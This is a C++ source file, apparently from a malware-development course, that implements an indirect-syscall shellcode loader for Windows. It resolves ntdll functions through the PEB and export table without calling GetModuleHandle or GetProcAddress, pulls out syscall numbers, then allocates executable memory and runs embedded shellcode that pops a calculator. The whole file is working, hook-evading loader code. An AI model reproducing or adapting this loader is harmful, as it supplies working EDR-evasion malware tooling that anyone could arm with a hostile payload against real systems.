#include <iostream>
#include <Windows.h>
#include <winternl.h>

// Static functions definitions

/**
* Credits to MALDEVACADEMY
* Compares two strings (case insensitive)
*/
BOOL IsStringEqual(IN LPCWSTR Str1, IN LPCWSTR Str2) {
    WCHAR   lStr1[MAX_PATH],
        lStr2[MAX_PATH];

    int		len1 = lstrlenW(Str1),
        len2 = lstrlenW(Str2);

    int		i = 0,
        j = 0;
    // Checking length. We dont want to overflow the buffers
    if (len1 >= MAX_PATH || len2 >= MAX_PATH)
        return FALSE;
    // Converting Str1 to lower case string (lStr1)
    for (i = 0; i < len1; i++) {
        lStr1[i] = (WCHAR)tolower(Str1[i]);
    }
    lStr1[i++] = L'\0'; // null terminating
    // Converting Str2 to lower case string (lStr2)
    for (j = 0; j < len2; j++) {
        lStr2[j] = (WCHAR)tolower(Str2[j]);
    }
    lStr2[j++] = L'\0'; // null terminating
    // Comparing the lower-case strings
    if (lstrcmpiW(lStr1, lStr2) == 0)
        return TRUE;
    return FALSE;
}




/**
* Credits to MALDEVACADEMY
* Retrieves the base address of a module from the PEB
* and enumerates the linked list of modules to find the correct one.
*/
HMODULE CustomGetModuleHandle(IN char szModuleName[]) {
    // convert char to LPCWSTR
    int wideStrLen = MultiByteToWideChar(CP_UTF8, 0, szModuleName, -1, nullptr, 0);
    wchar_t* wideStr = new wchar_t[wideStrLen];
    MultiByteToWideChar(CP_UTF8, 0, szModuleName, -1, wideStr, wideStrLen);
    LPCWSTR lpWideStr = wideStr;
    // Getting PEB
#ifdef _WIN64 // if compiling as x64
    PPEB			pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32 // if compiling as x32
    PPEB			pPeb = (PEB*)(__readfsdword(0x30));
#endif// Getting Ldr
    PPEB_LDR_DATA		    pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    // Getting the first element in the linked list which contains information about the first module
    PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
    while (pDte) {
        // If not null
        if (pDte->FullDllName.Length != NULL) {
            // Check if both equal
            if (IsStringEqual(pDte->FullDllName.Buffer, lpWideStr)) {
                //wprintf(L"[+] Module found from PEB : \"%s\" \n", pDte->FullDllName.Buffer);
                return(HMODULE)pDte->Reserved2[0];
            }
        }
        else {
            break;
        }
        // Next element in the linked list
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }
    wprintf(L"[+] Module not found in PEB");
    return NULL;
}



/**
* Credits to MALDEVACADEMY
* Retrieves the address of an exported function from a specified module handle.
* The function returns NULL if the function name is not found in the specified module handle.
*/
FARPROC CustomGetProcAddress(IN HMODULE hModule, IN char* lpApiName) {
    if (hModule == NULL)
        return NULL;
    // We do this to avoid casting at each time we use 'hModule'
    PBYTE pBase = (PBYTE)hModule;
    // Getting the dos header and doing a signature check
    PIMAGE_DOS_HEADER	pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;
    // Getting the nt headers and doing a signature check
    PIMAGE_NT_HEADERS	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;
    // Getting the optional header
    IMAGE_OPTIONAL_HEADER	ImgOptHdr = pImgNtHdrs->OptionalHeader;
    // Getting the image export table
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    // Getting the function's names array pointer
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    // Getting the function's addresses array pointer
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    // Getting the function's ordinal array pointer
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
    // Looping through all the exported functions
    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        // Getting the name of the function
        char* pFunctionName = (char*)(pBase + FunctionNameArray[i]);

        // Getting the address of the function through its ordinal
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        // Searching for the function specified
        if (strcmp(lpApiName, pFunctionName) == 0) {
            printf("[+] Function %s found at address 0x%p with ordinal %d\n", pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
            return (FARPROC)pFunctionAddress;
        }
    }
    printf("\n\t[!] Function %s not found\n", lpApiName);
    return NULL;
}













// Global variables definitions
EXTERN_C DWORD wNtAllocateVirtualMemory = 0;
EXTERN_C UINT_PTR sysAddrNtAllocateVirtualMemory = 0;
EXTERN_C DWORD wNtWriteVirtualMemory = 0;
EXTERN_C UINT_PTR sysAddrNtWriteVirtualMemory = 0;
EXTERN_C DWORD wNtCreateThreadEx = 0;
EXTERN_C UINT_PTR sysAddrNtCreateThreadEx = 0;
EXTERN_C DWORD wNtWaitForSingleObject = 0;
EXTERN_C UINT_PTR sysAddrNtWaitForSingleObject = 0;

// ASM functions definitions
extern "C" VOID CustomNtAllocateVirtualMemory(...);
extern "C" VOID CustomNtWriteVirtualMemory(...);
extern "C" VOID CustomNtCreateThreadEx(...);
extern "C" VOID CustomNtWaitForSingleObject(...);


int main()
{
    // Getting handle on ntdll module
    char _ntdll[] = { 'n','t','d','l','l','.','d','l','l',0 };
    printf("[+] Getting handle on ntdll module\n");
    HMODULE hNtdll = CustomGetModuleHandle(_ntdll);

    // Getting address of NtAllocateVirtualMemory
    char _NtAllocateVirtualMemory[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
    printf("\n[+] Getting address of NtAllocateVirtualMemory\n");
    FARPROC pNtAllocateVirtualMemory = CustomGetProcAddress(hNtdll, _NtAllocateVirtualMemory);
    // Getting syscall value of NtAllocateVirtualMemory
    UINT_PTR pNtAllocateVirtualMemorySyscallID = (UINT_PTR)pNtAllocateVirtualMemory + 4; // The syscall ID is typically located at the 4th byte of the function
    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemorySyscallID))[0];
    printf("[+] Syscall value of NtAllocateVirtualMemory : 0x%04x\n", wNtAllocateVirtualMemory);
    sysAddrNtAllocateVirtualMemory = (UINT_PTR)pNtAllocateVirtualMemory + 0x12; // (18 in decimal)
    printf("[+] Address of NtAllocateVirtualMemory syscall instruction in ntdll memory : 0x%p\n", sysAddrNtAllocateVirtualMemory);

    // Getting address of NtWriteVirtualMemory
    char _NtWriteVirtualMemory[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
    printf("\n[+] Getting address of NtWriteVirtualMemory\n");
    FARPROC pNtWriteVirtualMemory = CustomGetProcAddress(hNtdll, _NtWriteVirtualMemory);
    // Getting syscall value of NtWriteVirtualMemory
    UINT_PTR pNtWriteVirtualMemorySyscallID = (UINT_PTR)pNtWriteVirtualMemory + 4; // The syscall ID is typically located at the 4th byte of the function
    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemorySyscallID))[0];
    printf("[+] Syscall value of NtWriteVirtualMemory : 0x%04x\n", wNtWriteVirtualMemory);
    sysAddrNtWriteVirtualMemory = (UINT_PTR)pNtWriteVirtualMemory + 0x12; // (18 in decimal)
    printf("[+] Address of NtWriteVirtualMemory syscall instruction in ntdll memory : 0x%p\n", sysAddrNtWriteVirtualMemory);

    // Getting address of NtCreateThreadEx
    char _NtCreateThreadEx[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0 };
    printf("\n[+] Getting address of NtCreateThreadEx\n");
    FARPROC pNtCreateThreadEx = CustomGetProcAddress(hNtdll, _NtCreateThreadEx);
    // Getting syscall value of NtCreateThreadEx
    UINT_PTR pNtCreateThreadExSyscallID = (UINT_PTR)pNtCreateThreadEx + 4; // The syscall ID is typically located at the 4th byte of the function
    wNtCreateThreadEx = ((unsigned char*)(pNtCreateThreadExSyscallID))[0];
    printf("[+] Syscall value of NtCreateThreadEx : 0x%04x\n", wNtCreateThreadEx);
    sysAddrNtCreateThreadEx = (UINT_PTR)pNtCreateThreadEx + 0x12; // (18 in decimal)
    printf("[+] Address of NtCreateThreadEx syscall instruction in ntdll memory : 0x%p\n", sysAddrNtCreateThreadEx);

    // Getting address of NtWaitForSingleObject
    char _NtWaitForSingleObject[] = { 'N','t','W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
    printf("\n[+] Getting address of NtWaitForSingleObject\n");
    FARPROC pNtWaitForSingleObject = CustomGetProcAddress(hNtdll, _NtWaitForSingleObject);
    // Getting syscall value of NtWaitForSingleObject
    UINT_PTR pNtWaitForSingleObjectSyscallID = (UINT_PTR)pNtWaitForSingleObject + 4; // The syscall ID is typically located at the 4th byte of the function
    wNtWaitForSingleObject = ((unsigned char*)(pNtWaitForSingleObjectSyscallID))[0];
    printf("[+] Syscall value of NtWaitForSingleObject : 0x%04x\n", wNtWaitForSingleObject);
    sysAddrNtWaitForSingleObject = (UINT_PTR)pNtWaitForSingleObject + 0x12; // (18 in decimal)
    printf("[+] Address of NtWaitForSingleObject syscall instruction in ntdll memory : 0x%p\n", sysAddrNtWaitForSingleObject);





    printf("\n*******************************\n");
    printf("EXECUTING INDIRECT SYSCALLS !!\n");
    printf("*******************************\n\n");

    // https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode
    unsigned char shellcode[] = 
        "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
        "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
        "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
        "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
        "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
        "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
        "\x48\x83\xec\x20\x41\xff\xd6";


    PVOID allocBuffer = NULL;
    SIZE_T buffSize = sizeof(shellcode);
    // Use the NtAllocateVirtualMemory function to allocate memory for the shellcode
    printf("[+] Allocating memory for the shellcode with indirect syscall\n");
    CustomNtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&allocBuffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    SIZE_T bytesWritten;
    // Use the NtWriteVirtualMemory function to write the shellcode into the allocated memory
    printf("[+] Writing shellcode into the allocated memory with indirect syscall\n");
    CustomNtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &bytesWritten);

    HANDLE hThread;
    // Use the NtCreateThreadEx function to create a new thread that starts executing the shellcode
    printf("[+] Creating a new thread that starts executing the shellcode with indirect syscall\n");
    CustomNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, NULL, NULL, NULL, NULL);

    // Use the NtWaitForSingleObject function to wait for the thread to finish executing
    printf("[+] Waiting for the thread to finish executing with indirect syscall\n");
    CustomNtWaitForSingleObject(hThread, FALSE, NULL);
    
    return 0;
}